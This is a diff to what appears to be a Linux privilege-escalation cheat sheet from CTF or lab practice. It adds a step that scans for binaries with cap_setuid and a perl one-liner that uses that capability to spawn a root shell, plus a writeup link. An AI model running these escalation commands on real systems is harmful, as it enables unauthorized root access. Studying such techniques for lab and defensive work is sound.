@@ -42,6 +42,13 @@ IFS=$'\n'$'\r'; for item in $(find / -perm /2000 2>/dev/null); do if [ -w $item 
 grep comm=\"su\" /var/log/audit/*
 ```
 
+- Look for cap_setuid+ep
+```sh
+getcap -r / 2>/dev/null
+# /usr/bin/perl = cap_setuid+ep
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+```
+
 ### Cron jobs
 - Look for cron jobs executed as root
 ```
@@ -130,3 +137,4 @@ ___
 
 ### Writeups
 - https://blog.tryhackme.com/skynet-writeup/
+- https://s1gh.sh/tryhackme-wonderland/
